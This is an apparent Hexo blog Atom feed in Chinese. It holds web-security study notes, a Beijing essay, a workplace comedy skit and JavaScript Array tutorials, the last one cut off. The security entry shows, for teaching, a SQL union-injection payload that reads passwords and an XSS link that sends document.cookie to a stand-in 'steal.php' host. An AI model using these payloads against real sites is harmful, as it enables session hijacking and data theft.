<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Light</title>
  
  <subtitle>晚来天欲雪，能饮一杯无？</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-11-28T15:46:34.279Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Light</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Web安全的关键点</title>
    <link href="http://yoursite.com/undefined/Web%E5%AE%89%E5%85%A8%E7%9A%84%E5%85%B3%E9%94%AE%E7%82%B9/"/>
    <id>http://yoursite.com/undefined/Web安全的关键点/</id>
    <published>2018-04-21T02:11:16.000Z</published>
    <updated>2018-11-28T15:46:34.279Z</updated>
    
    <content type="html"><![CDATA[<p>本文是Web安全的学习笔记，摘自《web前端黑客揭秘》……</p><p>在理解整个Web安全方面的知识之旅中，有如下几个关键点作为支撑，希望后续一切可以顺利。en here we are</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.1 数据与指令</span><br><span class="line">1.2 浏览器的同源策略</span><br><span class="line">1.3 信任与信任关系</span><br><span class="line">1.4 社会工程学的作用</span><br><span class="line">1.5 布放不单一</span><br><span class="line">1.6 场景很重要</span><br></pre></td></tr></table></figure><h2 id="1-数据与指令"><a href="#1-数据与指令" class="headerlink" title="1 数据与指令"></a>1 数据与指令</h2><p>用浏览器打开一组网页，呈现在眼前的都是数据，数据类型有如下：</p><table><thead><tr><th style="text-align:center">数据类型</th><th style="text-align:center">数据内容</th></tr></thead><tbody><tr><td style="text-align:center">服务端储存数据</td><td style="text-align:center">数据库， 文件系统， 内存等；</td></tr><tr><td style="text-align:center">客户端储存数据</td><td style="text-align:center">本地cookie， Flash Cookie等；</td></tr><tr><td style="text-align:center">传输中的数据</td><td style="text-align:center">JSON数据， XML数据等</td></tr><tr><td style="text-align:center">文本数据</td><td style="text-align:center">HTML Javascirpt CSS等</td></tr><tr><td style="text-align:center">多媒体数据</td><td style="text-align:center">Flash  mp4 mp3 等</td></tr><tr><td style="text-align:center">图片数据 ……</td><td style="text-align:center">……</td></tr></tbody></table><p>这些数据构成了我们看到的web世界，表面看起来丰富多彩，但是在数据流的每一个环节都可能出现安全风险。因为数据有可能被污染，而不像预期那样存储和执行。存储，传输，呈现数据需要合理的指令，正是因为指令被解释执行，才能产生对应的数据内容，不同的指令的解释执行，由相应的环境完成，比如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,email,desc1 <span class="keyword">form</span> <span class="keyword">users</span> <span class="keyword">id</span>=<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>这是一条SQL查询指令，当指令被解释执行时，就会产生一组由username/email/desc1组成的数据，这里的解释环境为数据库引擎。在这条SQL语句中，如果id的值来自用户提交，并且用户是通过访问链接（<a href="http://www.foo.com/user.php?id=1）来获取自身的账号信息。那么当访问这个链接时，后端会执行上面的SQL语句，并且返回对应的id所包含的用户信息给前端展示。如果攻击者提交如下形式的值" target="_blank" rel="noopener">http://www.foo.com/user.php?id=1）来获取自身的账号信息。那么当访问这个链接时，后端会执行上面的SQL语句，并且返回对应的id所包含的用户信息给前端展示。如果攻击者提交如下形式的值</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union <span class="keyword">select</span> <span class="keyword">password</span>,<span class="number">1</span>,<span class="number">1</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br></pre></td></tr></table></figure><p>组成的链接为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.foo.com/user.php?id=1 union select password,1,1 from users;</span><br></pre></td></tr></table></figure><p>组成的SQL语句为:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selct username,email,desc1 from users where id=1 union <span class="keyword">select</span> <span class="keyword">password</span>,<span class="number">1</span>,<span class="number">1</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br></pre></td></tr></table></figure><p>如上所述，组成的SQL语句是合法的，一个经典的union查询，此时注入的指令内容会被当做合法的指令来执行，这样的攻击发生时，users表的password就会有泄漏的危险。</p><p>再比如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">  eval(location.hash.substr(1))</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>script标签内的是一个JavaScript指令，由JS引擎解释执行，解释的结果就是数据，而script标签本身是HTML指令，由浏览器dom引擎渲染执行；<strong>当正常的数据内容被注入指令内容，再解释的过程中，如果注入的指令能够被独立执行，那么攻击就发生了</strong>。</p><p>假设上述代码保存在<a href="http://www.foo.com/info.html中；如上代码功能如下：" target="_blank" rel="noopener">http://www.foo.com/info.html中；如上代码功能如下：</a></p><table><thead><tr><th>代码结构</th><th>功能</th></tr></thead><tbody><tr><td>eval()</td><td>该函数可计算某个字符串，并且执行其中的JavaScript代码</td></tr><tr><td>location.hash</td><td>获取链接（比如<a href="http://www.foo.com/info.html#callback）中的#符号以及其后面的内容" target="_blank" rel="noopener">http://www.foo.com/info.html#callback）中的#符号以及其后面的内容</a></td></tr><tr><td>substr(start,length)</td><td>可在字符串中截取start下标开始的指定书目的字符</td></tr><tr><td>location.hash.substr(1)</td><td>表示截取#符号之后的内容</td></tr></tbody></table><p>如果攻击者构造出如下链接</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.foo.com/info.html#new%20Image().src="http:www.eval.com/steal.php?c="+escape(document.cookie)</span></span><br></pre></td></tr></table></figure><p>那么浏览器解释执行以后，原来的语句会被解析成为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(location.hash.substr(<span class="number">1</span>)); <span class="comment">//原来的语句</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="keyword">new</span> Image().src=<span class="string">"http:www.eval.com/steal.php?c="</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie)); <span class="comment">//解析后的</span></span><br></pre></td></tr></table></figure><p>当被攻击者点击图片访问了该链接时，cookie会话信息就会被盗取到黑客的网站上。<strong>由此可以看到，攻击的发生是因为一段恶意的指令，并且该指令能够被执行。</strong></p><h2 id="2-浏览器的同源策略"><a href="#2-浏览器的同源策略" class="headerlink" title="2 浏览器的同源策略"></a>2 浏览器的同源策略</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文是Web安全的学习笔记，摘自《web前端黑客揭秘》……&lt;/p&gt;
&lt;p&gt;在理解整个Web安全方面的知识之旅中，有如下几个关键点作为支撑，希望后续一切可以顺利。en here we are&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table
      
    
    </summary>
    
    
      <category term="Web 笔记" scheme="http://yoursite.com/tags/Web-%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>北京的故事</title>
    <link href="http://yoursite.com/undefined/%E5%8C%97%E4%BA%AC%E7%9A%84%E6%95%85%E4%BA%8B/"/>
    <id>http://yoursite.com/undefined/北京的故事/</id>
    <published>2018-01-16T16:09:13.000Z</published>
    <updated>2018-04-16T17:14:00.804Z</updated>
    
    <content type="html"><![CDATA[<p>​    来北京已经小半年了。记得初来这里的时候，刚出车站，夏日灼热到处弥漫着这个城市。在东北三年的我还是不太适应这种闷似蒸笼的感觉，那时候，北京火车站人来人往，形形色色的人们各自在奔波自己的生活。</p><p>以下是我的测试文档。</p><p>this is my test word.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;​    来北京已经小半年了。记得初来这里的时候，刚出车站，夏日灼热到处弥漫着这个城市。在东北三年的我还是不太适应这种闷似蒸笼的感觉，那时候，北京火车站人来人往，形形色色的人们各自在奔波自己的生活。&lt;/p&gt;
&lt;p&gt;以下是我的测试文档。&lt;/p&gt;
&lt;p&gt;this is my t
      
    
    </summary>
    
      <category term="文章" scheme="http://yoursite.com/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="散记" scheme="http://yoursite.com/tags/%E6%95%A3%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>失落的记忆</title>
    <link href="http://yoursite.com/undefined/%E5%A4%B1%E8%90%BD%E7%9A%84%E8%AE%B0%E5%BF%86/"/>
    <id>http://yoursite.com/undefined/失落的记忆/</id>
    <published>2018-01-16T15:43:25.000Z</published>
    <updated>2018-01-16T15:46:13.522Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>描述：程序员日常</strong></p><p><strong>人物：产品经理 程序员A 程序员B 测试 设计 领导</strong></p><p><strong>概述：dsp日常</strong></p></blockquote><p><em>程序员们在上班，公司里面充斥着忙碌的敲代码的声音</em></p><p><strong>设计师：</strong> （伸懒腰）哎呀，今天真累呀，我还是先听会儿歌，享受一下。</p><p><em>音乐响起，众人上场： tfboys音乐《<strong>青春修炼手册》</strong>跳前一拍，要跳的笨拙有喜感</em></p><p><strong>领导：</strong>哎~哎~哎 都干嘛呢？Bug改完了吗？没有就赶快啊，等会儿我们开会。</p><p><em>程序员们坐回座位，领导离场</em></p><p><strong>测试：</strong> 我是测试，是产品的检查员，一开始，需求还没有完成的时候，我在写测试用例，什么功能问题啦，样式不好看啦，程序有漏洞啦，都是由我来检查的，每次，我报上一个bug，我感觉特别的爽，你们知道为什么吗？（有人互动‘ 为什么’）因为他们每次代码写完以后，我就得加班，他们一个个的都回家了，就剩我一个，你说我能愿意吗？我肯定不愿意，所以呀，我就恨不得立马报一些bug给他们，就像一首歌唱的：找呀找呀找bug，找到一个好bug,敬个礼呀握个手，大家就要加班喽~  （乐一乐）， 说白了我上班就是来玩游戏的，你们知道我玩的是什么吗？（互动‘不知道’），（测试举一个牌子，上面写道‘大家来找茬’）；</p><p><strong>程序员A：</strong>去去去（不耐烦的将测试拉回座位），我是最苦逼的程序员，天天加需求，天天改bug，天天加班，人家都说，嫁人要嫁程序员，为啥？钱多话少死的早呗。</p><p><em>音乐响起设计师上，与程序员一起唱一首歌<strong>《超人不会飞》</strong>改编为<strong>《程序员不会飞》</strong></em></p><p>歌词如下：</p><p>哦，如果程序员会飞，那就让我在空中停一停歇。</p><p>再次俯瞰这个世界，会让我觉得好一些。</p><p>哦~哦~哦，修改bug好累，虽然有点疲惫，但我还是会。</p><p>不要问我哭过了没，因为程序员不能流眼泪；</p><p><strong>设计师：</strong> 大家猜猜我是干什么的，看我这衣服，在看我这发型，哎，都猜对了，我就是设计师，问世界上谁最帅，肯定是我，为什么？你猜，ps，美肤，我样样精通，你们说什么？美图秀秀，我才不用那种垃圾东西呢。哎，话说最近啊我真的是特别愁，为什么？产品汪天天让我调UI，把我累得死去活来的，还能不能让我安心的做个美男子了? （回头问身后的几个猿）你们说是不是；</p><p><strong>程序员B：</strong>别提那产品汪，我都想揍他，天天改需求。</p><p><strong>测试：</strong>对 我也想，</p><p><strong>设计师：</strong>咱们一起去揍烂他，走走走~（众人一起下台，揍产品经理去了）</p><p><em>音乐响起《二泉映月》，被打残的产品经理（胳膊大腿都缠着绷带）上</em></p><p><strong>产品经理：</strong>再说苦逼，你们看看，谁最苦逼，你们是不是很想知道我这是怎么搞的，哎！说多了都是泪呀！这不，我就是让他们改一下UI，把按钮从左上角移到右下角，然后再加点间距，整点阴影，哎，你们说难吗？根本不难嘛，对吧？另外我琢磨着，谷歌那个搜索用的人也蛮多的，这不，我也让他们给我整一个，结果他们搞了好多天都没有搞出个像样的，哎~ 我看他们天天加班，这么辛苦，这不，我决定把所有的需求都还原回去，结果，他们居然这样对我，（指着自己被打残的腿）你们快看看呀！</p><p><strong>众打手（测试设计程序员们）：</strong>原来你在这儿，别跑~别跑~</p><p><em>众人追上产品经理，一顿暴打，混乱中，领导上</em></p><p><strong>领导</strong>：你们又在找产品的麻烦，这是不对的哦，赶紧赶紧开会，搞什么鬼啊！</p><p><em>众人坐定，领导开始训话</em></p><p><strong>领导：</strong>今天我们来开一下会啊，总结一下2017年，展望一下2018年。今天，我们要结合一下2017年，我们收购了百度是不是？（众人点头赞同）也在纳斯达克上市了，那我们想象下一个版本的功能，大家有什么意见，有什么想法，提出来？</p><p><strong>程序员B：</strong>雷总，我听说VR虚拟现实现在特别火，咱们也搞一个虚拟现实，让我们的客户体验一下什么是vip超级用户的感觉，小王小李，把咱的效果给展示一下子，先让雷总开开眼。</p><p><em>《my heart will go on》背景音乐响起，产品经理和测试一起上演泰塔尼克号jack&amp;rose（自带道具，一定要有屌丝气质）<em>**</em></em></p><p><strong>程序员B</strong>:（随着音乐，为伴舞二人诵诗，屌丝版）**看啊，海风习习的傍晚，夹克儿和肉丝儿，面向夕阳，微风吹乱了他们的秀发，两人在爱的海洋里，沉醉，沉醉，。。。。。。。。。。</p><p><strong>领导：</strong>嗯嗯，不错不错，这个想法很好，非常棒，给大家一个月的时间，搞定它，散会！</p><p><strong>众人抱怨：</strong>这根本做不完啊，一个月！！！！</p><p><em>领导不予理睬，下台，音乐响起，所有人慢慢站成一排，一起歌唱改编版的《我的歌声里》 =&gt; 《我的bug里》）；</em></p><p>歌词如下：</p><p>没有一点点防备，也没有一丝顾虑，突然错误出现；</p><p>在我的日志里，带给我惊喜，身不由己；</p><p>可你偏有这样呢 在我不知不觉中悄悄地消失；</p><p>在我的堆栈离没有音讯， 剩下了报警短信；</p><p>你存在 我某一个模块里 我的梦里 我的心里 我的程序里；</p><p>你存在，我那一块模块里，我的梦里，我的心里，我的程序里；</p><p>还记得我们曾经，肩并肩一起排查，某个线上的问题；</p><p>尽管一切看起来没法下手，但我们没有放弃自己的接口；</p><p>一个断点 一个结构 一行一行注释的背后；</p><p>好像是一场战斗 不能回头；</p><p>你存在我某一行代码里， 我的梦里，我的心里，我的程序里；</p><p>你存在 我某一个模块里 我的梦里 我的心里 我的程序里；</p><p>你存在我某一行代码里， 我的梦里，我的心里，我的程序里。</p><p><strong>领导：</strong>（深情款款）新的的一年里，依然是写bug，依然是改bug, 依然，我们还是那个目光如炬，心怀梦想的少年，发丝渐疏终不悔，为伊消得人憔悴。2018 愿大家不忘初心 继续前行！！！</p><p><strong>众人鞠躬，背景音乐响起，众人愉快离场。</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;描述：程序员日常&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;人物：产品经理 程序员A 程序员B 测试 设计 领导&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;概述：dsp日常&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquo
      
    
    </summary>
    
      <category term="文章" scheme="http://yoursite.com/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="散记" scheme="http://yoursite.com/tags/%E6%95%A3%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>浅谈Array方法（二）</title>
    <link href="http://yoursite.com/undefined/%E6%B5%85%E8%B0%88Array%E6%96%B9%E6%B3%95%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>http://yoursite.com/undefined/浅谈Array方法（二）/</id>
    <published>2017-12-30T15:29:11.000Z</published>
    <updated>2017-12-30T15:32:12.370Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前面的话："><a href="#前面的话：" class="headerlink" title="前面的话："></a>前面的话：</h2><p>​    继续上次的话题，这次我们来聊一聊 ES5当中数组的方法。虽然感觉自己只是对于原有知识点的陈述，但是在写博文的过程当中，又学到了很多以前不曾注意的知识点，这一点真令人兴奋。</p><p><strong>今天介绍的数组方法如下：</strong></p><blockquote><ul><li>forEach()</li><li>map()</li><li>filter()</li><li>every() &amp; some()</li><li>reduce &amp; reduceRight()</li><li>indexOf() &amp; lastIndexOf()</li></ul></blockquote><p><em>本文参考《JavaScript权威指南》、<a href="http://www.zhangxinxu.com/wordpress/2013/04/es5%E6%96%B0%E5%A2%9E%E6%95%B0%E7%BB%84%E6%96%B9%E6%B3%95/#indexof" target="_blank" rel="noopener">张鑫旭老师的个人网站</a>，以及《JavaScript高级程序设计》</em></p><h2 id="正文：Es5当中数组方法的介绍"><a href="#正文：Es5当中数组方法的介绍" class="headerlink" title="正文：Es5当中数组方法的介绍"></a>正文：Es5当中数组方法的介绍</h2><h3 id="1-forEach"><a href="#1-forEach" class="headerlink" title="1.forEach()"></a>1.forEach()</h3><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; array.forEach(callback(currentValue, index, array)&#123;</span><br><span class="line">&gt;     <span class="comment">//do something</span></span><br><span class="line">&gt; &#125;, <span class="keyword">this</span>)</span><br><span class="line">&gt; array.forEach(callback, [thisArg])</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>undefined</p><h4 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h4><p>forEach() 的作用是对于数组的循环遍历</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line">a.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(value);</span><br><span class="line">&#125;)  </span><br><span class="line"><span class="comment">//等同于for循环</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; a.length; i ++) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(a[i])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该方法的参数是 function 回调函数（必选）和一个this（可选），根据以下代码，回调函数内的参数是这样来的！</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> b = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line">b.forEach(<span class="built_in">console</span>.log)</span><br></pre></td></tr></table></figure><p>执行结果：</p><p> <img src="https://i.loli.net/2017/12/29/5a461ef2a02fc.png" alt="forEach验证"></p><p>由此可看出，forEach() 方法中的function 回调函数支持三个参数。第一个参数为遍历数组的内容，第二个参数是内容对应的索引，第三个参数是数组本身。</p><blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="comment">//所以语法如下</span></span><br><span class="line">&gt; <span class="built_in">Array</span>.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">value, index, arr</span>) </span>&#123;</span><br><span class="line">&gt;   <span class="comment">//...</span></span><br><span class="line">&gt; &#125;)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>对比 jquery 中的 $.each() 方法，两个用法很接近，但是要注意jQuery 中value 和 index 的位置颠倒了；</p><blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="comment">//jQuery当中的语法</span></span><br><span class="line">&gt; $.each([], <span class="function"><span class="keyword">function</span> (<span class="params">index, value, arr</span>) </span>&#123;</span><br><span class="line">&gt;   <span class="comment">// ...</span></span><br><span class="line">&gt; &#125;)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>而对于</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array.forEach(callback, [thisArg])</span><br></pre></td></tr></table></figure><p>thisArg 为可选参数，当执行回调函数的时候用作this的值；举个例子：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Counter</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.sum = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">this</span>.count = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">Counter.prototype.add = <span class="function"><span class="keyword">function</span> (<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  arr.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">entry</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.sum += entry;</span><br><span class="line">    ++<span class="keyword">this</span>.count;</span><br><span class="line">  &#125;, <span class="keyword">this</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> Counter();</span><br><span class="line">obj.add([<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>]);</span><br><span class="line"><span class="built_in">console</span>.log(obj.count)  <span class="comment">// =&gt; 4</span></span><br><span class="line"><span class="built_in">console</span>.log(obj.sum)<span class="comment">// =&gt; 16</span></span><br></pre></td></tr></table></figure><p>因为thisArg参数（this）传给forEach，每次调用的时候，它都被传递给callback函数，作为它的this值；</p><p><strong>注意：</strong>如果使用箭头函数表达式传入函数参数，thisArg参数就会失效，因为箭头函数在词法上绑定了this</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Counter</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.sum = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">this</span>.count = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">Counter.prototype.add = <span class="function"><span class="keyword">function</span> (<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  arr.forEach(<span class="function">(<span class="params">entry</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">this</span>.sum += entry;</span><br><span class="line">    ++<span class="keyword">this</span>.count;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> Counter();</span><br><span class="line">obj.add([<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>]);</span><br><span class="line"><span class="built_in">console</span>.log(obj.count)   <span class="comment">// =&gt; 4</span></span><br><span class="line"><span class="built_in">console</span>.log(obj.sum) <span class="comment">// =&gt; 16</span></span><br></pre></td></tr></table></figure><p>可以参考<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/forEach" target="_blank" rel="noopener">MDN相关链接</a>对正</p><h3 id="2-map"><a href="#2-map" class="headerlink" title="2.map()"></a>2.map()</h3><p>map 在此是映射的意思，它的用法基本和forEach方法类似；</p><h4 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h4><blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">let</span> new_array = arr.map(<span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params">currentValue, index, array</span>) </span>&#123; </span><br><span class="line">&gt;     <span class="comment">// Return element for new_array </span></span><br><span class="line">&gt; &#125;,[thisArg])</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h4 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h4><p>一个新的数组，每一个元素都是回调函数的结果；</p><h4 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h4><p>map的 callback 和 thisArg 的用法都和forEach是类似的，所以方法不再赘述；唯一不同的是它返回的是一个新的数组，原来的数组被改变改变了；</p><p>可以参考<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/map" target="_blank" rel="noopener">MDN相关链接</a>对正</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前面的话：&quot;&gt;&lt;a href=&quot;#前面的话：&quot; class=&quot;headerlink&quot; title=&quot;前面的话：&quot;&gt;&lt;/a&gt;前面的话：&lt;/h2&gt;&lt;p&gt;​    继续上次的话题，这次我们来聊一聊 ES5当中数组的方法。虽然感觉自己只是对于原有知识点的陈述，但是在写博文
      
    
    </summary>
    
      <category term="JavaScript" scheme="http://yoursite.com/categories/JavaScript/"/>
    
    
      <category term="JavaScript" scheme="http://yoursite.com/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>浅谈Array方法（一）</title>
    <link href="http://yoursite.com/undefined/%E6%B5%85%E8%B0%88Array%E6%96%B9%E6%B3%95%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://yoursite.com/undefined/浅谈Array方法（一）/</id>
    <published>2017-12-28T16:54:57.000Z</published>
    <updated>2017-12-30T15:40:11.085Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>​    时光如白驹过隙，2017已进入尾声。受很多前端前辈的影响，我的个人博客也在年末搭建了下来，希望自己可以好好坚持，砥砺前行，最终有所建树吧！</p><p>这是我正儿八经写的第一篇博客，选择数组来开刀，为什么呢？因为数组包容性太大，可能也会包容我的稚嫩与浅薄，原谅我会犯一些错误吧。如若有幸，被路过的朋友看到，还请多多指教哇！</p><h4 id="1-join"><a href="#1-join" class="headerlink" title="1.join()"></a>1.join()</h4><p>Array.join() 将数组中的所有元素转换成字符串并且拼接在一起，返回值为该字符串；</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].join()  <span class="comment">// =&gt; "1,2,3"</span></span><br></pre></td></tr></table></figure><p>我们可以指定一个可选的字符串在生成的字符串中来分隔数组的各个元素，默认情况下使用逗号；</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].join(<span class="string">"-"</span>) <span class="comment">// =&gt; "1-2-3"</span></span><br></pre></td></tr></table></figure><p>它的逆向操作是 String.split() 前者的作用是把数组里的元素拼接成字符串，后者的作用是把字符串拆分成数组；</p><h4 id="2-reverse"><a href="#2-reverse" class="headerlink" title="2.reverse()"></a>2.reverse()</h4><p>Array.reverse() 可以实现数组当中元素的顺序颠倒，返回该元素的逆序数组。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].reverse()  <span class="comment">// =&gt; [3,2,1]</span></span><br></pre></td></tr></table></figure><p>该方法并没有产生新的数组，而是在原先的数组当中重新排列元素；</p><h4 id="3-sort"><a href="#3-sort" class="headerlink" title="3.sort()"></a>3.sort()</h4><p>Array.sort() 方法可以实现对数组中元素的排序，并且返回排序后的数组。在不带参数的情况下，数组以字母顺序进行排序，如果遇到转换类型，则以字符串的形式进行排序；</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'a'</span>].sort() <span class="comment">// =&gt; ['a', 'b', 'c']</span></span><br><span class="line">[<span class="number">23</span>, <span class="number">1</span>, <span class="number">111</span>, <span class="number">3</span>].sort() <span class="comment">// =&gt; [1, 111, 23, 3]</span></span><br></pre></td></tr></table></figure><p>一般情况下，为了实现按照预期的规则进行排序，则需要为sort()方法传递一个比较函数，比较函数中有两个参数，若第一个参数应当在前，则函数返回一个小于零的值，反之则返回大于零的数值，如果两个参数值相等，则说明顺序无关紧要，比较函数返回零；</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arr.sort(<span class="function"><span class="keyword">function</span>(<span 